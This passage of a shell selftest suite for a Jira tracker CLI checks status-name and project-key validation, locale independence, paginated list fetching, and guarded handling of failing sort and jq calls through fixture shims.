printf 'sort: write failed: standard output: Broken pipe\n' >&2
exit 1
SORTFAULTEOF
  chmod +x "$s8bin/sort"
  _tj_fx status-ids-cloud
  s8_origpath=$PATH
  PATH="$s8bin:$PATH"; export PATH
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$tmpd/item8.err") || rc=$?
  PATH=$s8_origpath; export PATH
  err=$(cat "$tmpd/item8.err" 2>/dev/null)
  [ "$rc" -eq 2 ] && [ -z "$out" ] && [ "$err" = "unverified: could not sort the statuses" ] \
    && echo "PASS: selftest — a failing final sort refuses, rc 2, empty stdout, the fixed sentence, whole-file stderr compare (T2c0 item 8 / T2a seat L-3)" \
    || { echo "FAIL: selftest — a failing sort was not refused cleanly (rc=$rc out='$out' err='$err')"; sfail=1; }

  # --- fix1 F-3a: a 61-char status name -> rc 2, empty stdout (I-4: the name-length check existed
  # with NO test proving it — delete/restore verified separately, see the evidence log) ---
  _tj_fx status-ids-name-61
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — a 61-char status name yields rc 2, empty stdout (fix1 F-3a)" \
    || { echo "FAIL: selftest — a 61-char status name was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- fix1 F-3b: an empty status name -> rc 2, empty stdout (I-4: existed with NO test) ---
  _tj_fx status-ids-empty-name
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — an empty status name yields rc 2, empty stdout (fix1 F-3b)" \
    || { echo "FAIL: selftest — an empty status name was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- fix1 F-3c: an apostrophe in a status name ("Won't Do") -> accepted, name present verbatim
  # in stdout (the apostrophe-strip exists so the grammar check ignores it; I-4: existed with NO
  # test) ---
  _tj_fx status-ids-apostrophe
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  case "$out" in
    *"10005	Won't Do"*) f3cok=1 ;;
    *) f3cok=0 ;;
  esac
  [ "$rc" -eq 0 ] && [ "$f3cok" -eq 1 ] && echo "PASS: selftest — an apostrophe in a status name is accepted, present verbatim in stdout (fix1 F-3c)" \
    || { echo "FAIL: selftest — an apostrophe status name was not accepted verbatim (rc=$rc out='$out')"; sfail=1; }

  # --- T2b2 0e: a status name of EXACTLY 60 characters (the ACCEPT boundary of the {1,60} length
  # class) is ACCEPTED, present verbatim (T2a's own fixture only ever exercised the REJECT side —
  # 61 chars and empty — never the accept edge itself; sharing the apostrophe fixture, whose leg
  # above already proves rc 0/multi-status parsing). --------------------------------------------
  case "$out" in
    *"10006	Sixty Character Status Name For The Boundary Test Case-ABCDE"*) f0eok=1 ;;
    *) f0eok=0 ;;
  esac
  [ "$rc" -eq 0 ] && [ "$f0eok" -eq 1 ] && echo "PASS: selftest — a 60-character status name (the ACCEPT boundary) is accepted, present verbatim (T2b2 0e)" \
    || { echo "FAIL: selftest — a 60-character status name was not accepted (rc=$rc out='$out')"; sfail=1; }

  # --- fix1 F-3d: _tj_project_ok's FIRST-CHARACTER arm — "1AB" (digit-led) and "_AB"
  # (underscore-led) are refused pre-request, rc 1, argv log empty (I-4: leg 8's own fixture
  # "ab/../x" also fails the SECOND arm's `*[!A-Z0-9_]*` check, since '/' and '.' are not in
  # [A-Z0-9_] — it never isolated the first-char arm; "1AB"/"_AB" contain ONLY [A-Z0-9_]
  # characters, so they can be refused ONLY by the first-char arm) ---
  : > "$argvlog"
  rc=0
  tj_status_ids https://ex.atlassian.net cloud "1AB" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — a digit-led project ('1AB') is refused before any request (fix1 F-3d-1)"
  else
    echo "FAIL: selftest — a digit-led project ('1AB') was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi

  : > "$argvlog"
  rc=0
  tj_status_ids https://ex.atlassian.net cloud "_AB" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — an underscore-led project ('_AB') is refused before any request (fix1 F-3d-2)"
  else
    echo "FAIL: selftest — an underscore-led project ('_AB') was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi

  # --- fix1 F-4: the name grammar must be locale-independent (m-1). LC_ALL only affects a shell's
  # glob/collation behaviour if it is set BEFORE that shell process starts (verified — reassigning
  # it mid-process, as a naive first attempt at this leg did, is VACUOUS: see the evidence log). So
  # this leg spawns a genuinely FRESH sh/dash process with LC_ALL=en_US.UTF-8 as a prefix on ITS OWN
  # invocation, by extracting this file's own function definitions (everything before the CLI
  # dispatch marker) into a throwaway driver in $tmpd and calling tj_status_ids directly there. ---
  _tj_fx status-ids-locale-name
  _tj_cli_line=$(grep -n '^# --- CLI' "$0" | head -1 | cut -d: -f1)
  _tj_locale_check="$tmpd/locale-check.sh"
  head -n $((_tj_cli_line - 1)) "$0" > "$_tj_locale_check"
  {
    printf '_TJ_CURL_BIN="$1"; shift\n'
    printf 'tj_status_ids "$@"\n'
  } >> "$_tj_locale_check"
  rc=0
  out=$(LC_ALL=en_US.UTF-8 sh "$_tj_locale_check" "$shim" https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  f4_sh_ok=0; [ "$rc" -eq 2 ] && [ -z "$out" ] && f4_sh_ok=1
  # T2b2 0d: this leg used to FAIL THE WHOLE SELFTEST on a host with no `dash` binary — follow
  # conformance/prepush-lane.sh:650's own pattern (`command -v dash`; absent -> an UNVERIFIED/SKIP
  # note, never a hard FAIL). Proved the detection itself (not just read it): the SAME expression,
  # run against a synthetic PATH holding none of this box's dash directories, DOES report absent —
  # so the branch below is not merely assumed correct, it is exercised.
  _tj_f4_syn_absent=1
  if PATH="$tmpd" command -v dash >/dev/null 2>&1; then _tj_f4_syn_absent=0; fi
  if [ "$_tj_f4_syn_absent" -ne 1 ]; then
    echo "FAIL: selftest — the dash-detection expression itself did not report absent under a synthetic dash-less PATH (T2b2 0d self-check)"; sfail=1
  fi
  f4_dash_note=""
  if command -v dash >/dev/null 2>&1; then
    rc=0
    out=$(LC_ALL=en_US.UTF-8 dash "$_tj_locale_check" "$shim" https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
    f4_dash_ok=0; [ "$rc" -eq 2 ] && [ -z "$out" ] && f4_dash_ok=1
  else
    f4_dash_ok=1
    f4_dash_note=" (dash arm SKIPPED — UNVERIFIED: no dash on PATH; the lane never substitutes the operator's shell — install dash to verify: brew install dash)"
  fi
  # T2b2 0d: same UNVERIFIED-not-FAIL treatment for a missing en_US.UTF-8 locale — proved against a
  # SYNTHETIC `locale -a`-shaped list that does not carry it, using the identical grep predicate.
  f4_locale_note=""
  _tj_f4_syn_locale_absent=1
  if printf '%s\n' "C" "POSIX" "en_GB.UTF-8" | grep -qi '^en_us\.utf-\?8$'; then _tj_f4_syn_locale_absent=0; fi
  if [ "$_tj_f4_syn_locale_absent" -ne 1 ]; then
    echo "FAIL: selftest — the locale-detection predicate itself matched a synthetic list that does not carry en_US.UTF-8 (T2b2 0d self-check)"; sfail=1
  fi
  if ! command -v locale >/dev/null 2>&1 || ! locale -a 2>/dev/null | grep -qi '^en_us\.utf-\?8$'; then
    f4_locale_note=" (locale UNVERIFIED — en_US.UTF-8 not in \`locale -a\`)"
  fi
  if [ "$f4_sh_ok" -eq 1 ] && [ "$f4_dash_ok" -eq 1 ]; then
    echo "PASS: selftest — a non-ASCII name ('Dóne') yields rc 2 under LC_ALL=en_US.UTF-8 on a fresh sh process${f4_dash_note}${f4_locale_note} (fix1 F-4 / T2b2 0d)"
  else
    echo "FAIL: selftest — a non-ASCII name ('Dóne') was not refused under LC_ALL=en_US.UTF-8 (sh_ok=$f4_sh_ok dash_ok=$f4_dash_ok)"; sfail=1
  fi

  # --- T2c0 item 6 (T2a seat L-1): `_tj_project_ok`'s collation-proof shape, same fresh-process
  # mechanism as the leg above — a lowercase second character ('Ab') must refuse on BOTH shells
  # under LC_ALL=en_US.UTF-8, before any request. ---------------------------------------------------
  _tj_fx list-page1
  _tj_pc_check="$tmpd/locale-check-project.sh"
  head -n $((_tj_cli_line - 1)) "$0" > "$_tj_pc_check"
  {
    printf '_TJ_CURL_BIN="$1"; shift\n'
    printf '_tj_search_all cloud "Ab" "https://ex.atlassian.net/rest/api/3/search/jql" "project = AB AND status = 3" 200 %s\n' "'[\"key\"]'"
  } >> "$_tj_pc_check"
  : > "$argvlog"
  rc=0
  out=$(LC_ALL=en_US.UTF-8 sh "$_tj_pc_check" "$shim" 2>/dev/null) || rc=$?
  pc_sh_ok=0; [ "$rc" -eq 1 ] && [ -z "$out" ] && [ ! -s "$argvlog" ] && pc_sh_ok=1
  pc_dash_note=""
  if command -v dash >/dev/null 2>&1; then
    : > "$argvlog"
    rc=0
    out=$(LC_ALL=en_US.UTF-8 dash "$_tj_pc_check" "$shim" 2>/dev/null) || rc=$?
    pc_dash_ok=0; [ "$rc" -eq 1 ] && [ -z "$out" ] && [ ! -s "$argvlog" ] && pc_dash_ok=1
  else
    pc_dash_ok=1
    pc_dash_note=" (dash arm SKIPPED — UNVERIFIED: no dash on PATH — install dash to verify: brew install dash)"
  fi
  pc_locale_note=""
  if ! command -v locale >/dev/null 2>&1 || ! locale -a 2>/dev/null | grep -qi '^en_us\.utf-\?8$'; then
    pc_locale_note=" (locale UNVERIFIED — en_US.UTF-8 not in \`locale -a\`)"
  fi
  # 0c: 'Ab' only exercises the SECOND (negated) check; a revert of the FIRST class alone is an
  # EQUIVALENT mutant given the second check's own coverage (quality seat: 779 cases swept, 0
  # differences, sh and dash). 'bA' is kept as a regression pin on normal behaviour.
  _tj_pc_check2="$tmpd/locale-check-project2.sh"
  head -n $((_tj_cli_line - 1)) "$0" > "$_tj_pc_check2"
  {
    printf '_TJ_CURL_BIN="$1"; shift\n'
    printf '_tj_search_all cloud "bA" "https://ex.atlassian.net/rest/api/3/search/jql" "project = AB AND status = 3" 200 %s\n' "'[\"key\"]'"
  } >> "$_tj_pc_check2"
  : > "$argvlog"
  rc=0
  out=$(LC_ALL=en_US.UTF-8 sh "$_tj_pc_check2" "$shim" 2>/dev/null) || rc=$?
  pc2_sh_ok=0; [ "$rc" -eq 1 ] && [ -z "$out" ] && [ ! -s "$argvlog" ] && pc2_sh_ok=1
  if command -v dash >/dev/null 2>&1; then
    : > "$argvlog"
    rc=0
    out=$(LC_ALL=en_US.UTF-8 dash "$_tj_pc_check2" "$shim" 2>/dev/null) || rc=$?
    pc2_dash_ok=0; [ "$rc" -eq 1 ] && [ -z "$out" ] && [ ! -s "$argvlog" ] && pc2_dash_ok=1
  else
    pc2_dash_ok=1
  fi
  if [ "$pc_sh_ok" -eq 1 ] && [ "$pc_dash_ok" -eq 1 ] && [ "$pc2_sh_ok" -eq 1 ] && [ "$pc2_dash_ok" -eq 1 ]; then
    echo "PASS: selftest — a project with a lowercase second character ('Ab') or a lowercase FIRST character ('bA') refuses, rc 1, zero requests, under LC_ALL=en_US.UTF-8 on a fresh sh AND dash process${pc_dash_note}${pc_locale_note} (T2c0 item 6 / T2a seat L-1 / 0c)"
  else
    echo "FAIL: selftest — 'Ab' or 'bA' was not refused under LC_ALL=en_US.UTF-8 (sh_ok=$pc_sh_ok dash_ok=$pc_dash_ok sh2_ok=$pc2_sh_ok dash2_ok=$pc2_dash_ok)"; sfail=1
  fi

}
_tj_st_list_in_states() {

  # --- T2c leg 2: `tj_list_in_states` — a thin op over `_tj_search_all` with fields ["key"], JQL
  # `project = "<P>" AND status in (<ids>) ORDER BY key ASC`, output sorted `LC_ALL=C`. -------------
  opsdir="$fixdir/ops"
  # (d) no status id -> rc 1, zero requests, before any request.
  : > "$argvlog"
  l2d_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 >/dev/null 2>"$tmpd/l2d.err" || l2d_rc=$?
  l2d_ok=0; [ "$l2d_rc" -eq 1 ] && [ ! -s "$argvlog" ] && l2d_ok=1
  if [ "$l2d_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states with no status id refuses, rc 1, zero requests (T2c leg 2d)"
  else
    echo "FAIL: selftest — list-in-states with no status id was not refused pre-request (rc=$l2d_rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$(cat "$tmpd/l2d.err" 2>/dev/null)')"; sfail=1
  fi

  # (e) a non-numeric status id -> rc 1, zero requests.
  : > "$argvlog"
  l2e_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 "not-a-status" >/dev/null 2>"$tmpd/l2e.err" || l2e_rc=$?
  l2e_ok=0; [ "$l2e_rc" -eq 1 ] && [ ! -s "$argvlog" ] && l2e_ok=1
  if [ "$l2e_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states with a non-numeric status id refuses, rc 1, zero requests (T2c leg 2e)"
  else
    echo "FAIL: selftest — list-in-states with a non-numeric status id was not refused pre-request (rc=$l2e_rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$(cat "$tmpd/l2e.err" 2>/dev/null)')"; sfail=1
  fi

  # (k) an empty status id ('') -> rc 1, zero requests, the fixed sentence (SB-4).
  : > "$argvlog"
  l2k_rc=0
  l2k_err=$(tj_list_in_states https://ex.atlassian.net cloud AB 50 '' 2>&1 >/dev/null) || l2k_rc=$?
  if [ "$l2k_rc" -eq 1 ] && [ ! -s "$argvlog" ] \
     && [ "$l2k_err" = "refused: list-in-states requires numeric status ids" ]; then
    echo "PASS: selftest — list-in-states with an empty status id refuses, rc 1, zero requests, the fixed sentence (SB-4 / T2c leg 2k)"
  else
    echo "FAIL: selftest — list-in-states with an empty status id was not refused cleanly (rc=$l2k_rc dispatched=$([ -s "$argvlog" ] && echo yes || echo no) err='$l2k_err') (SB-4 / T2c leg 2k)"; sfail=1
  fi

  # (a) Cloud two pages -> stdout FILE cmp'd against ops/list-cloud.out, rc 0.
  _tj_fxseq list-page1 list-page2
  : > "$argvlog"
  l2a_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 3 10001 > "$tmpd/l2a.out" 2>"$tmpd/l2a.err" || l2a_rc=$?
  l2a_ok=0; [ "$l2a_rc" -eq 0 ] && cmp -s "$tmpd/l2a.out" "$opsdir/list-cloud.out" && l2a_ok=1
  if [ "$l2a_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states Cloud two-page fetch matches ops/list-cloud.out byte-for-byte, rc 0 (T2c leg 2a)"
  else
    echo "FAIL: selftest — list-in-states Cloud output did not match ops/list-cloud.out (rc=$l2a_rc out='$(cat "$tmpd/l2a.out" 2>/dev/null)' err='$(cat "$tmpd/l2a.err" 2>/dev/null)')"; sfail=1
  fi

  # (c) the recorded body's JQL is exactly `project = "AB" AND status in (3,10001) ORDER BY key ASC`.
  l2c_lastbody=$(cat "$tmpd/.lastbody" 2>/dev/null || true)
  case "$l2c_lastbody" in
    *'"project = \"AB\" AND status in (3,10001) ORDER BY key ASC"'*) l2c_ok=1 ;;
    *) l2c_ok=0 ;;
  esac
  if [ "$l2c_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states' recorded JQL is exactly the quoted-project string (T2c leg 2c / F-12d)"
  else
    echo "FAIL: selftest — list-in-states' recorded JQL did not match (body='$l2c_lastbody')"; sfail=1
  fi

  # (b) DC two pages -> stdout FILE cmp'd against ops/list-dc.out, rc 0.
  _tj_fxseq dc-list-page1 dc-list-page2
  : > "$argvlog"
  l2b_rc=0
  tj_list_in_states https://ex.example.com datacenter AB 200 3 10001 > "$tmpd/l2b.out" 2>"$tmpd/l2b.err" || l2b_rc=$?
  l2b_ok=0; [ "$l2b_rc" -eq 0 ] && cmp -s "$tmpd/l2b.out" "$opsdir/list-dc.out" && l2b_ok=1
  if [ "$l2b_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states Data Center two-page fetch matches ops/list-dc.out byte-for-byte, rc 0 (T2c leg 2b)"
  else
    echo "FAIL: selftest — list-in-states DC output did not match ops/list-dc.out (rc=$l2b_rc out='$(cat "$tmpd/l2b.out" 2>/dev/null)' err='$(cat "$tmpd/l2b.err" 2>/dev/null)')"; sfail=1
  fi

  # (f) a complete read with ZERO issues -> rc 0, an EMPTY file (distinguished from failure by rc
  # alone: an empty file with rc 0 is a legal empty list; any non-zero rc means failure, never a list).
  _tj_fx list-zero-issues
  : > "$argvlog"
  l2f_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 3 > "$tmpd/l2f.out" 2>"$tmpd/l2f.err" || l2f_rc=$?
  l2f_ok=0; [ "$l2f_rc" -eq 0 ] && [ ! -s "$tmpd/l2f.out" ] && l2f_ok=1
  if [ "$l2f_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states on a complete zero-issue page yields rc 0, an empty file (T2c leg 2f)"
  else
    echo "FAIL: selftest — list-in-states on a zero-issue page did not yield rc 0 + empty (rc=$l2f_rc out='$(cat "$tmpd/l2f.out" 2>/dev/null)' err='$(cat "$tmpd/l2f.err" 2>/dev/null)')"; sfail=1
  fi

  # (g) a truncation (cap reached on a complete page) -> rc 2, empty file, through the op.
  _tj_fx list-cap-exact
  : > "$argvlog"
  l2g_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 3 3 > "$tmpd/l2g.out" 2>"$tmpd/l2g.err" || l2g_rc=$?
  l2g_ok=0; [ "$l2g_rc" -eq 2 ] && [ ! -s "$tmpd/l2g.out" ] && l2g_ok=1
  if [ "$l2g_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states truncated at the cap yields rc 2, empty file (T2c leg 2g)"
  else
    echo "FAIL: selftest — list-in-states did not truncate cleanly at the cap (rc=$l2g_rc out='$(cat "$tmpd/l2g.out" 2>/dev/null)' err='$(cat "$tmpd/l2g.err" 2>/dev/null)')"; sfail=1
  fi

  # (h) invariant 6 — output is `LC_ALL=C sort`ed even when the server's own page order is not
  # ascending (a hostile/misbehaving server is not trusted for byte determinism).
  _tj_fx list-unsorted-order
  l2h_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 3 > "$tmpd/l2h.out" 2>"$tmpd/l2h.err" || l2h_rc=$?
  l2h_ok=0; [ "$l2h_rc" -eq 0 ] && [ "$(cat "$tmpd/l2h.out")" = "$(printf 'AB-1\nAB-2\nAB-3')" ] && l2h_ok=1
  if [ "$l2h_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states sorts its output even when the server's page order is not ascending (T2c leg 2h / invariant 6)"
  else
    echo "FAIL: selftest — list-in-states did not sort a non-ascending page (rc=$l2h_rc out='$(cat "$tmpd/l2h.out" 2>/dev/null)' err='$(cat "$tmpd/l2h.err" 2>/dev/null)')"; sfail=1
  fi

  # (i) invariant 2 — the final sort is guarded (the T2c0 item-8 pattern): a PATH-level `sort`
  # wrapper that faults it must refuse cleanly, rc 2, the fixed sentence, never a raw abort.
  s8libin="$tmpd/s8libin"; mkdir -p "$s8libin"
  cat > "$s8libin/sort" <<'SORTLIFAULTEOF'
#!/bin/sh
printf 'sort: write failed: standard output: Broken pipe\n' >&2
exit 1
SORTLIFAULTEOF
  chmod +x "$s8libin/sort"
  _tj_fx list-unsorted-order
  s8li_origpath=$PATH
  PATH="$s8libin:$PATH"; export PATH
  l2i_rc=0
  l2i_out=$(tj_list_in_states https://ex.atlassian.net cloud AB 200 3 2>"$tmpd/l2i.err") || l2i_rc=$?
  PATH=$s8li_origpath; export PATH
  l2i_err=$(cat "$tmpd/l2i.err" 2>/dev/null)
  if [ "$l2i_rc" -eq 2 ] && [ -z "$l2i_out" ] && [ "$l2i_err" = "unverified: could not sort the list" ]; then
    echo "PASS: selftest — list-in-states' final sort is guarded, rc 2, empty stdout, the fixed sentence (T2c leg 2i / T2c0 item-8 pattern)"
  else
    echo "FAIL: selftest — a failing sort in list-in-states was not refused cleanly (rc=$l2i_rc out='$l2i_out' err='$l2i_err')"; sfail=1
  fi

  # (j) fix1 F1 — the key-extraction jq is captured on its own line, not piped bare into `sort`: a
  # PATH-level `jq` wrapper that faults ONLY the `-r .key` projection must refuse cleanly, rc 2, the
  # fixed sentence, on both a no-output failure and a partial-then-fail one (else the pipeline's own
  # rc would be `sort`'s alone, hiding a real jq failure behind a silent short/empty list).
  s8jqbin="$tmpd/s8jqbin"; mkdir -p "$s8jqbin"
  REALJQ=$(command -v jq); export REALJQ
  cat > "$s8jqbin/jq" <<'SORTJQFAULTEOF'
#!/bin/sh
if [ "$1" = "-r" ] && [ "$2" = ".key" ]; then
  _s8jq_in=$(cat)
  # only the FINAL list extraction feeds jq the whole (multi-line) result set; the per-object
  # validators (_tj_sa_validate_keys/_tj_sa_dedup) each feed exactly one compact object.
  case "$_s8jq_in" in
    *"
"*)
      case "$_TJ_LIS_JQMODE" in
        fail) exit 1 ;;
        partial) printf 'AB-1\n'; exit 1 ;;
      esac ;;
  esac
  printf '%s' "$_s8jq_in" | "$REALJQ" "$@"
  exit $?
fi
exec "$REALJQ" "$@"
SORTJQFAULTEOF
  chmod +x "$s8jqbin/jq"
  s8jq_origpath=$PATH
  l2j_ok=1
  for _TJ_LIS_JQMODE in fail partial; do
    export _TJ_LIS_JQMODE
    _tj_fx list-unsorted-order
    PATH="$s8jqbin:$PATH"; export PATH
    l2j_rc=0
    l2j_out=$(tj_list_in_states https://ex.atlassian.net cloud AB 200 3 2>"$tmpd/l2j-$_TJ_LIS_JQMODE.err") || l2j_rc=$?
    PATH=$s8jq_origpath; export PATH
    l2j_err=$(cat "$tmpd/l2j-$_TJ_LIS_JQMODE.err" 2>/dev/null)
    l2j_errlen=${#l2j_err}
    if [ "$l2j_rc" -eq 2 ] && [ -z "$l2j_out" ] && [ "$l2j_err" = "unverified: could not extract the list keys" ] && [ "$l2j_errlen" -eq 43 ]; then
      :
    else
      l2j_ok=0
      echo "FAIL: selftest — list-in-states did not refuse cleanly when jq's key extraction failed, mode=$_TJ_LIS_JQMODE (rc=$l2j_rc out='$l2j_out' err='$l2j_err' errlen=$l2j_errlen)"; sfail=1
    fi
  done
  unset _TJ_LIS_JQMODE
  if [ "$l2j_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states refuses cleanly when the key-extraction jq fails, both a no-output and a partial-then-fail mode, rc 2, empty stdout, the fixed sentence, whole-file stderr compare (43 bytes) (T2c fix1 F1)"
  fi

  # --- T3x leg 1: a one-page READY-state read -> ops/list-cloud-ready.out (AB-2, AB-3), rc 0. ------
  _tj_fx list-ready
  t3x1_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 3 > "$tmpd/t3x1.out" 2>"$tmpd/t3x1.err" || t3x1_rc=$?
  t3x1_ok=0; [ "$t3x1_rc" -eq 0 ] && cmp -s "$tmpd/t3x1.out" "$opsdir/list-cloud-ready.out" && t3x1_ok=1
  if [ "$t3x1_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states on the READY-state fixture matches ops/list-cloud-ready.out byte-for-byte, rc 0 (T3x leg 1)"
  else
    echo "FAIL: selftest — list-in-states READY-state output did not match ops/list-cloud-ready.out (rc=$t3x1_rc out='$(cat "$tmpd/t3x1.out" 2>/dev/null)' err='$(cat "$tmpd/t3x1.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3x leg 2: a one-page IN-PROGRESS-state read -> ops/list-cloud-inprogress.out (AB-1, AB-4),
  # disjoint from leg 1's READY set (AB-1 is the reader's own subject issue, listed in its own
  # state) — the `comm` disjointness check lives in the evidence log, not here. -------------------
  _tj_fx list-inprogress
  t3x2_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 3 > "$tmpd/t3x2.out" 2>"$tmpd/t3x2.err" || t3x2_rc=$?
  t3x2_ok=0; [ "$t3x2_rc" -eq 0 ] && cmp -s "$tmpd/t3x2.out" "$opsdir/list-cloud-inprogress.out" && t3x2_ok=1
  if [ "$t3x2_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states on the IN-PROGRESS-state fixture matches ops/list-cloud-inprogress.out byte-for-byte, rc 0 (T3x leg 2)"
  else
    echo "FAIL: selftest — list-in-states IN-PROGRESS-state output did not match ops/list-cloud-inprogress.out (rc=$t3x2_rc out='$(cat "$tmpd/t3x2.out" 2>/dev/null)' err='$(cat "$tmpd/t3x2.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3x leg 3: a complete read with ZERO issues -> ops/list-cloud-empty.out (0 bytes), rc 0 —
  # distinguished from a refusal by rc alone, matching T2c leg 2f's own invariant.
  _tj_fx list-zero-issues
  t3x3_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 3 > "$tmpd/t3x3.out" 2>"$tmpd/t3x3.err" || t3x3_rc=$?
  t3x3_ok=0; [ "$t3x3_rc" -eq 0 ] && cmp -s "$tmpd/t3x3.out" "$opsdir/list-cloud-empty.out" && t3x3_ok=1
  if [ "$t3x3_ok" -eq 1 ]; then
    echo "PASS: selftest — list-in-states on a complete zero-issue read matches ops/list-cloud-empty.out (0 bytes), rc 0 (T3x leg 3)"
  else
    echo "FAIL: selftest — list-in-states zero-issue output did not match ops/list-cloud-empty.out (rc=$t3x3_rc out='$(cat "$tmpd/t3x3.out" 2>/dev/null)' err='$(cat "$tmpd/t3x3.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2c leg 3: CLI arm `list-in-states)`, following `status-ids)`'s own pattern. A genuinely
  # fresh process, with `_TJ_CURL_BIN` overridden BETWEEN the function definitions and the CLI
  # dispatch (never via the environment — the production path hardcodes it, H-1). ------------------
  _tj_cli_line=$(grep -n '^# --- CLI' "$0" | head -1 | cut -d: -f1)
  _tj_lis_cli_check="$tmpd/lis-cli-check.sh"
  head -n $((_tj_cli_line - 1)) "$0" > "$_tj_lis_cli_check"
  printf '_TJ_CURL_BIN=%s\n' "$shim" >> "$_tj_lis_cli_check"
  tail -n +"$_tj_cli_line" "$0" >> "$_tj_lis_cli_check"
  _tj_fxseq list-page1 list-page2
  : > "$argvlog"
  l3_rc=0
  sh "$_tj_lis_cli_check" list-in-states https://ex.atlassian.net cloud AB 200 3 10001 \
    > "$tmpd/l3.out" 2>"$tmpd/l3.err" || l3_rc=$?
  l3_ok=0; [ "$l3_rc" -eq 0 ] && cmp -s "$tmpd/l3.out" "$opsdir/list-cloud.out" && l3_ok=1
  if [ "$l3_ok" -eq 1 ]; then
    echo "PASS: selftest — the CLI verb 'list-in-states' on the Cloud fixtures matches ops/list-cloud.out, rc 0 (T2c leg 3)"
  else
    echo "FAIL: selftest — the CLI verb 'list-in-states' did not behave as expected (rc=$l3_rc out='$(cat "$tmpd/l3.out" 2>/dev/null)' err='$(cat "$tmpd/l3.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2c leg 4 (moved from the retired search-state's own N-1 leg — the richest -K case: user +
  # header + data + request, none glued onto another line; fix1 F7: also the one still-live check
  # for search-state's own retired B-1 leg — the token never on curl's argv on THIS op's POST path).
  _tj_fxseq list-page1 list-page2
  : > "$argvlog"
  tj_list_in_states https://ex.atlassian.net cloud AB 200 3 10001 >/dev/null 2>&1 || true
  cfgfile="$tmpd/.lastcfg"
  n1ok=1
  grep -q '^user = "' "$cfgfile" 2>/dev/null || n1ok=0
  grep -q '^header = "Content-Type: application/json"$' "$cfgfile" 2>/dev/null || n1ok=0
  grep -q '^data = "@' "$cfgfile" 2>/dev/null || n1ok=0
  grep -q '^request = "POST"$' "$cfgfile" 2>/dev/null || n1ok=0
  grep -q "s3cr3t-token-XYZ" "$argvlog" 2>/dev/null && n1ok=0
  if [ "$n1ok" -eq 1 ] && ! grep -Eq '^(user = "[^"]*"|header = "Content-Type: application/json"|data = "@[^"]*"|request = "POST").+' "$cfgfile" 2>/dev/null; then
    echo "PASS: selftest — list-in-states' richest -K config (user+header+data+request) has no glued directives, and the token never appears on curl's argv (N-1 / fix1 F7, moved from retired search-state's B-1)"
  else
    echo "FAIL: selftest — list-in-states' -K config was missing a directive, had one glued onto another line, or leaked the token onto argv"; sfail=1
  fi

  # --- T2c leg 4: search-state is RETIRED — the verb now gets today's unknown-verb refusal
  # (rc 2, the usage sentence on stderr), same as any other unrecognised verb. -----------------------
  _tj_ss_cli_check="$tmpd/ss-cli-check.sh"
  head -n $((_tj_cli_line - 1)) "$0" > "$_tj_ss_cli_check"
  printf '_TJ_CURL_BIN=%s\n' "$shim" >> "$_tj_ss_cli_check"
  tail -n +"$_tj_cli_line" "$0" >> "$_tj_ss_cli_check"
  ss_rc=0
  sh "$_tj_ss_cli_check" search-state https://ex.atlassian.net cloud AB 3 > "$tmpd/ss.out" 2>"$tmpd/ss.err" || ss_rc=$?
  ss_ok=0; [ "$ss_rc" -eq 2 ] && [ ! -s "$tmpd/ss.out" ] \
    && grep -q '^usage: tracker-jira.sh' "$tmpd/ss.err" 2>/dev/null && ss_ok=1
  if [ "$ss_ok" -eq 1 ]; then
    echo "PASS: selftest — the retired 'search-state' verb now gets the unknown-verb refusal, rc 2, the usage sentence (T2c leg 4)"
  else
    echo "FAIL: selftest — 'search-state' did not get the unknown-verb refusal (rc=$ss_rc out='$(cat "$tmpd/ss.out" 2>/dev/null)' err='$(cat "$tmpd/ss.err" 2>/dev/null)')"; sfail=1
  fi

}
_tj_st_search_cloud() {

  # --- T2b1 leg 1: Cloud, two pages (page1 isLast:false+token, page2 isLast:true) -> rc 0; the
  # file holds one compact object per validated issue across BOTH pages, in order. -------------
  _tj_fxseq list-page1 list-page2
  : > "$argvlog"
  sa_out="$tmpd/sa1.out"; sa_rc=0
